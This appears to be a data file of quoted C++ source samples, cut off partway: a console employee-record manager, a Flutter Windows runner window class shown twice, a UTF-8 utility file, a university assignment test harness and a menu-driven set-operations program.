    "#include<iostream>\r\n#include<bits/stdc++.h>\r\n#include<stdlib.h>\r\n\r\n#include<string>\r\nusing namespace std;\r\nint i=0;\r\nstruct Employee\r\n{\r\n\tint id;\r\n\tfloat salary;\r\n\tstring name , address,phone,department;\r\n}E[25];\r\nvoid insert()\r\n{\r\n\tsystem(\"cls\");\r\n    cout<<\"\\n\\n INSERT EMPLOYEE RECORD   \";\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE ID->\";\r\n\t\r\n\tcin>>E[i].id;\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE NAME-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].name);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE ADDRESS-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].address);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE PHONE -> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].phone);\r\n\t\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE DEPARTMENT-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].department);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE SALARY-> \";\r\n\t\r\n\tcin>>E[i].salary;\r\n\ti++;\r\n\tcout<<\"\\n\\n ***EMPLOYEE RECORD INSERTED SUCCCESSFULLY ****\";\r\n}\r\nvoid search()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n EMPLOYEE MANAGEMENT SYSTEM\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR SEARCH-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE NAME-> \"<<E[a].name;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE ADDRESS-> \"<<E[a].address;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE PHONE NO.-> \"<<E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE DEPARTMENT -> \"<<E[a].department;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE SALARY-> \"<<E[a].salary;\r\n\t\t\t\tfound++;\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\nvoid update()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n----------------------- EMPLOYEE MANAGEMENT SYSTEM-----------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR UPDATE-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE NAME-> \";\r\n\t\t\t\tcin.ignore();\t\t\t\tgetline(cin,E[a].name);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE ADDRESS-> \";\r\n\t\t\t\r\n\t\t\t\tgetline(cin,E[a].address);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE PHONE NO.-> \";\r\n\t\t\t\t\r\n\t\t\t\tcin>>E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE DEPARTMENT -> \";\r\n\t\t\t\tcin.ignore();\r\n\t\t\t\tgetline(cin,E[a].department);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE SALARY-> \";\r\n\t\t\t\tcin>>E[a].salary;\r\n\t\t\t\tfound++;\r\n\t\t\t\tcout<<\"\\n\\n *** RECORD UPDATE SUCCESSFULLY ***\";\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid del()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n-------------------- EMPLOYEE MANAGEMENT SYSTEM--------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR DELETE-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\tfor(int k=a;k<i-1;k++)\r\n\t\t\t{\r\n\t\t\t\tE[k].id=E[k+1].id;\r\n\t\t\t\tE[k].name=E[k+1].name;\r\n\t\t\t\tE[k].address=E[k+1].address;\r\n\t\t\t\tE[k].phone=E[k+1].phone;\r\n\t\t\t\tE[k].department=E[k+1].department;\r\n\t\t\t\tE[k].salary=E[k+1].salary;\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\ti--;\r\n\t\t\t\tcout<<\"\\n\\n *** RECORD DELETE  SUCCESSFULLY ***\";\r\n\t\t\t\tfound++;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\nvoid show()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n --------------------EMPLOYEE MANAGEMENT SYSTEM-------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\t\r\n\t\t     \tcout<<\"\\n\\n EMPLOYEE ID -> \"<<E[a].id;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE NAME-> \"<<E[a].name;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE ADDRESS-> \"<<E[a].address;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE PHONE NO.-> \"<<E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE DEPARTMENT -> \"<<E[a].department;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE SALARY-> \"<<E[a].salary;\r\n\t\t\t\tcout<<\"\\n\\n ---------------------------------------\";\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\r\n\t\t}\r\n\t\r\n\t}\r\n}\r\nint main()\r\n{\r\n\tp:\r\n\t\r\n\t\r\n\t\tint choice;\r\n\tfor(int i=1;i<=23;i++)\r\n\t{\r\n\t    \r\n\t\r\n\tcout<<\"\\n\\n EMPLOYEE MANAGEMENT SYSTEM\";\r\n\tcout<<\"\\n\\n 1. INSERT EMPLOYEE\";\r\n\tcout<<\"\\n\\n 2. SEARCH EMPLOYEE\";\r\n\tcout<<\"\\n\\n 3. UPDATE EMPLOYEE \";\r\n\tcout<<\"\\n\\n 4. DELETE  EMPLOYEE \";\r\n\tcout<<\"\\n\\n 5. SHOW ALL  EMPLOYEE \";\r\n\tcout<<\"\\n\\n 6. EXIT\";\r\n\tcout<<\"\\n\\n ENTER YOUR CHOICE-> \";\r\n\tcin>>choice;\r\n\t\r\n\tswitch(choice)\r\n\t{\r\n\t\tcase 1:\r\n\t\t\tinsert();\r\n\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tsearch();\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\tupdate();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 4:\r\n\t\t\t\t\t\tdel();\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase 5:\r\n\t\t\t\t\t\t\tshow();\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\tcase 6:\r\n\t\t\t\t\t\t\t\texit(0);\r\n\t\t\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\t\t\tcout<<\"\\n\\n INVALID OPTION.... PLEASE TRY AGAIN \";\r\n\t\t\t\t\t\t\t\t\t\r\n\t}\r\n\t}\r\n\treturn 0;\r\n\tgoto p;\r\n}\r\n\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\n* Ho Chi Minh City University of Technology\n* Faculty of Computer Science and Engineering\n* Initial code for Assignment 1\n* Programming Fundamentals Spring 2023\n* Author: Vu Van Tien\n* Date: 01.03.2023\n*/\n\n//The library here is concretely set, students are not allowed to include any other libraries.\n\n#include \"study_in_pink2.h\"\n\nusing namespace std;\n\nvoid g_satc_02() { // global\n    cout << \"----- Sample Testcase 02 -----\" << endl;\n    Configuration * config = new Configuration(\"sa_tc_02_config\");\n    cout << config->str() << endl;\n    delete config;\n}\n\nclass TestStudyInPink {\npublic:\n    TestStudyInPink() = default;\n\n    static void satc_01() {\n        cout << \"----- Sample Testcase 01 -----\" << endl;\n        int num_walls = 3;\n        Position arr_walls[] = {Position(1, 2), Position(2, 3), Position(3, 4)};\n        int num_fake_walls = 1;\n        Position arr_fake_walls[] = {Position(2, 0)};\n\n        Map * map = new Map(10, 10, num_walls, arr_walls, num_fake_walls, arr_fake_walls);\n        \n        Sherlock * sherlock = new Sherlock(1, \"RUU\", Position(1, 3), map, 250, 450);\n        cout << sherlock->str() << endl;\n\n        Watson * watson = new Watson(2, \"LU\", Position(2, 1), map, 300, 350);\n        cout << watson->str() << endl;\n\n        Criminal * criminal = new Criminal(0, Position(7, 9), map, sherlock, watson);\n        cout << criminal->str() << endl;\n\n        cout << \"* Sherlock makes a move\" << endl;\n        sherlock->move();\n        cout << sherlock->str() << endl;\n\n        cout << \"* Watson makes a move\" << endl;\n        watson->move();\n        cout << watson->str() << endl;\n\n        cout << \"* Criminal makes a move\" << endl;\n        criminal->move();\n        cout << criminal->str() << endl;\n\n        ArrayMovingObject * arr_mv_objs = new ArrayMovingObject(10);\n        arr_mv_objs->add(criminal);\n        arr_mv_objs->add(sherlock);\n        arr_mv_objs->add(watson);\n        cout << arr_mv_objs->str() << endl;\n        \n        delete arr_mv_objs;\n        delete sherlock;\n        delete watson;\n        delete criminal;\n        delete map;\n    }\n\n    static void satc_02() {\n        g_satc_02();\n    }\n\n    static void satc_03() {\n        // Sample test for RobotC\n        cout << \"----- Sample Testcase 03 -----\" << endl;\n        int num_walls = 3;\n        Position arr_walls[] = {Position(1, 2), Position(2, 3), Position(3, 4)};\n        int num_fake_walls = 1;\n        Position arr_fake_walls[] = {Position(2, 0)};\n\n        Map * map = new Map(10, 10, num_walls, arr_walls, num_fake_walls, arr_fake_walls);\n\n        Sherlock * sherlock = new Sherlock(1, \"RUU\", Position(1, 3), map, 250, 450);\n        Watson * watson = new Watson(2, \"LU\", Position(2, 1), map, 300, 350);\n        Criminal * criminal = new Criminal(0, Position(7, 9), map, sherlock, watson);\n        criminal->move();\n\n        RobotC * robotC = new RobotC(3, Position(7,9), map, criminal);\n        cout << \"Current position of Criminal: \" << criminal->str() << endl;\n        cout << \"Criminal makes a move\" << endl;\n        criminal->move();\n        cout << \"New position of Criminal: \" << criminal->str() << endl;\n\n        cout << \"Current position of robotC: \" << robotC->str() << endl;\n        cout << \"RobotC makes a move\" << endl;\n        robotC->move();\n        cout << \"New position of robotC: \" << robotC->str() << endl;\n\n        delete sherlock;\n        delete watson;\n        delete criminal;\n        delete map;\n        delete robotC;\n    }\n};\n\nint main(int argc, const char * argv[]) {\n    // TestStudyInPink::satc_01();\n    // TestStudyInPink::satc_02();\n    // TestStudyInPink::satc_03();\n    return 0;\n}",
    "#include<iostream>\nusing namespace std;\n\nclass Set\n{\n\t\tint set[20];\n\t\tint size;\n\tpublic:\n\t\tSet() : size(0)\n\t\t{}\n\t\t\n\t\tvoid insert(int);\n\t\t\n\t\tvoid display()\n\t\t{\n\t\t\tcout<<\"Set Contains : \";\n\t\t\tfor(int i = 0 ; i < size ; i++)\n\t\t\t\tcout<<set[i] << \"\\t\" ;\n\t\t\tcout<<\"\\n\\n\";\n\t\t}\n\t\tint search(int key)\n\t\t{\n\t\t    for(int i = 0; i < size ; i++)\n\t\t    {\n\t\t        if(set[i] == key)\n\t\t            return i+1;\n\t\t    }\n\t\t    return 0;\n\t\t}\n\t\t\n\t\tvoid remove(int key) \n\t\t{\n\t\t\tint index = search(key);\n\t\t\tif(index)\n\t\t\t{\n\t\t\t\tfor(int i = index - 1 ; i < size ; i++)\n\t\t\t\t{\n\t\t\t\t\tset[i] = set[i+1];\t\n\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\tsize--;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout<<\"Element Not Found!\\n\";\n\t\t\t}\n\t\t}\n\t\t\n\t\tvoid uni(Set& s)\n\t\t{\n\t\t\tSet temp;\n\t\t\t\n\t\t\tfor(int i = 0; i < size; i++)\n\t\t\t{\n\t\t\t\ttemp.insert(set[i]);\t\t\t\t\n\t\t\t}\n\t\t\t\n\t\t\tfor(int j = 0; j < s.size; j++)\n\t\t\t{\n\t\t\t\tint index = temp.search(s.set[j]);\n\t\t\t\tif(!index)\n\t\t\t\t{\n\t\t\t\t\ttemp.insert(s.set[j]);\n\t\t\t\t}\t\t\t\t\n\t\t\t}\n\t\t\tcout<<\"\\n-----After Union-----\\n\";\n\t\t\ttemp.display();\t\t\t\t\t\n\t\t}\n\t\tvoid intersection(Set& s)\n\t\t{\n\t\t\tSet temp;\n\t\t\tint index;\n\t\t\tfor(int j = 0; j < s.size; j++)\n\t\t\t{\n\t\t\t\tindex = search(s.set[j]);\n\t\t\t\tif(index)\n\t\t\t\t{\n\t\t\t\t\ttemp.insert(s.set[j]);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcout<<\"\\n-----After Intersection-----\\n\";\n\t\t\tif(temp.size == 0)\n\t\t\t\tcout<<\"It is a Null Set\\n\";\n\t\t\telse\n\t\t\t\ttemp.display();\n\t\t}\n\t\tvoid difference(Set& s)\n\t\t{\n\t\t\tSet temp;\n\t\t\t\n\t\t\tint index;\n\t\t\tfor(int j = 0; j < s.size; j++)\n\t\t\t{\n\t\t\t\tindex = search(s.set[j]);\n\t\t\t\tif(!index)\n\t\t\t\t{\n\t\t\t\t\ttemp.insert(s.set[j]);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcout<<\"\\n-----After Difference Operation-----\\n\";\n\t\t\ttemp.display();\n\t\t}\n\t\tint subset(Set& s)\n\t\t{\n\t\t\tfor(int i = 0; i < s.size ; i++)\n\t\t\t{\n\t\t\t\tif(!search(s.set[i]))\n\t\t\t\t\treturn 0;\n\t\t\t}\n\t\t\treturn 1;\n\t\t}\n\t\t\n\t\t\n}; \nvoid Set::insert(int ele)\n{\n\tset[size++] = ele;\t\n}\nint main()\n{\n\tSet s1,s2;\n\tint ch;\n\t\t\n\tdo\n\t{\n\t\tcout<<\"\\n----MENU----\\n\";\n\t\tcout<<\"1.Add an element in Set 1\\n\";\n\t\tcout<<\"2.Display Set 1\\n\";\n\t\tcout<<\"3.Search an element in Set 1\\n\";\n\t\tcout<<\"4.Remove an element in Set 1\\n\";\n\t\t\n\t\tcout<<\"\\n5.Add an element in Set 2\\n\";\n\t\tcout<<\"6.Display Set 2\\n\";\n\t\tcout<<\"7.Search an element in Set 2\\n\";\n\t\tcout<<\"8.Remove an element in Set 2\\n\\n\";\n\t\t\n\t\tcout<<\"9.Union of Set 1 and Set 2\\n\";\n\t\tcout<<\"10.Intersection of Set 1 and Set 2\\n\";\n\t\tcout<<\"11.Difference of Set 1 and Set 2\\n\";\n\t\tcout<<\"12.Check if Set 2 is subset of Set 1\\n\";\n\t\t\n\t\tcout<<\"13.Exit\\n\\n\";\n\t\tcout<<\"Enter your choice : \";\t\n\t\tcin>>ch;\n\t\tint ele,key;\n\t\tint index;\n\t\tswitch(ch)\n\t\t{\n\t\t\tcase 1:\n\t\t\t\tcout<<\"Enter the Element to be inserted : \";\n\t\t\t\tcin>>ele;\n\t\t\t\ts1.insert(ele);\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\ts1.display();\n\t\t\t\tbreak;\n\t\t    case 3:\n\t\t        cout<<\"Enter the element to be searched : \";\n\t\t        cin>>key;\n\t\t        index = s1.search(key);\n\t\t        \n\t\t        if(index)\n\t\t            cout<<\"Element found at \"<<index<<\"th location\\n\";\n\t\t        else\n\t\t            cout<<\"Element Not Found!\\n\";\n\t\t        break;\n\t\t\tcase 4:\n\t\t        cout<<\"Enter the element to be Removed : \";\n\t\t        cin>>key;\n\t\t        s1.remove(key);\n\t\t        break;\n\t\t  \t\n\t\t  \tcase 5:\n\t\t\t\tcout<<\"Enter the Element to be inserted : \";\n\t\t\t\tcin>>ele;\n\t\t\t\ts2.insert(ele);\n\t\t\t\tbreak;\n\t\t\tcase 6:\n\t\t\t\ts2.display();\n\t\t\t\tbreak;\n\t\t    case 7:\n\t\t        cout<<\"Enter the element to be searched : \";\n\t\t        cin>>key;\n\t\t        index = s2.search(key);\n\t\t        \n\t\t        if(index)\n\t\t            cout<<\"Element found at \"<<index<<\"th location\\n\";\n\t\t        else\n\t\t            cout<<\"Element Not Found!\\n\";\n\t\t        break;\n\t\t\tcase 8:\n\t\t        cout<<\"Enter the element to be Removed : \";\n\t\t        cin>>key;\n\t\t        s2.remove(key);\n\t\t        break; \n\t\t    \n\t\t   \tcase 9:\n\t\t   \t\ts1.uni(s2);\n\t\t   \t\tbreak;\n\t\t   \tcase 10:\n\t\t   